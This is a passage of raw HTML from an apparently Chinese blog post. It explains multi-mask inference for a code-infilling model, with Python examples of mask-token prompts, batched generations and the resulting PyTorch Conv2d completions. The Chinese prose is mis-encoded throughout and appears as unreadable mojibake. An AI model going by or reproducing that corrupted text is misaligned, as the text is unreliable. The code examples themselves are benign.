class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&lt;|mask:&#123;&#125;|&gt;&quot;</span>.<span class="hljs-built_in">format</span>(extra_end, index)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> infill_code + <span class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&quot;</span>.<span class="hljs-built_in">format</span>(index)<br></code></pre></td></tr></table></figure><p>åœ¨å·²ç»maskè¿‡çš„ä»£ç åé¢æ·»åŠ ä¸¤ä¸ªmaskï¼š</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯maskçš„æ•°é‡</li><li>ç¬¬äºŒä¸ªæ˜¯éœ€è¦æ¨ç†çš„maskçš„idx</li></ul><p>æ¯”å¦‚ï¼š</p><ul><li><p>ä¾‹ä¸€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">conv = torch.&lt;|mask:0|&gt;(1, 1, 3)&lt;|mask:1|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>ä¾‹äºŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>tmp_prompt = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F&lt;|endofmask|&gt;&lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><span class="hljs-comment"># â€¦â€¦</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul><h2 id="model-predict-multi"><a href="#model-predict-multi" class="headerlink" title="model_predict_multi"></a>model_predict_multi</h2><p>ä¸¾ä¸¤ä¸ªä¾‹å­è¯´æ˜ï¼š</p><ul><li><p>å¦‚æœåªæœ‰ä¸€ä¸ªmaskéœ€è¦æ¨ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>å…ˆè°ƒç”¨build_input_multiæ·»åŠ é¢å¤–çš„mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n_infill = <span class="hljs-string">&#x27;conv = torch.&lt;|mask:0|&gt;(1, 1, 3)&lt;|mask:1|&gt;&lt;|mask:0|&gt;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>å†repeatæˆbatch_sizeé•¿åº¦çš„åˆ—è¡¨</p></li><li><p>generateï¼Œç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.Conv2d(n_channels, n_filters[0], kernel_size=(7, 7), stride=2, padding=</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>,<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.functional.max_pool1d(x, </span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">â€¦â€¦</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.functional.pad(conv, </span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    randn</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>ç”¨ç¬¬äºŒä¸ª&lt;|mask:0|&gt;å’Œ&lt;|endofmask|&gt;ä¹‹é—´çš„ä»£ç ä»£æ›¿&lt;|mask:0|&gt;ï¼Œå¦‚æœæ²¡æœ‰&lt;|endofmask|&gt;åˆ™ä¸¢å¼ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">outputs = [<br>    <span class="hljs-string">&#x27;conv = torch.nn.Conv2d(n_channels, n_filters[0], kernel_size=(7, 7), stride=2, padding=(1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.nn.functional.max_pool1d(x, (1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.nn.functional.pad(conv, (1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.randn(1, 1, 3)&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul></li><li><p>å¦‚æœæœ‰å¤šä¸ªmaskéœ€è¦æ¨ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>æ¯æ¬¡å¾ªç¯å‰éƒ½è¦è°ƒç”¨build_input_multiæ·»åŠ é¢å¤–çš„mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>å†repeatæˆbatch_sizeé•¿åº¦çš„åˆ—è¡¨</p></li><li><p>generateï¼Œç»“æœ1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&quot;&quot;&quot;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;|endoftext|&gt;import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>clean codeï¼Œæ·»åŠ maskåçš„tmp_promptï¼Œéœ€è¦æ¨ç†ç¬¬äºŒä¸ªmask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_prompt = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>generateï¼Œç»“æœ2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    3, 64, kernel_size=4, padding=1)\n</span><br><span class="hljs-string">    \n</span><br><span class="hljs-string">    print(type(conv2d))\n</span><br><span class="hljs-string">    print(conv2d</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    3,16, 3, padding=1)\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    print(output_np</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    2,4,3,padding = 1, bias = False</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    â€¦â€¦ </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    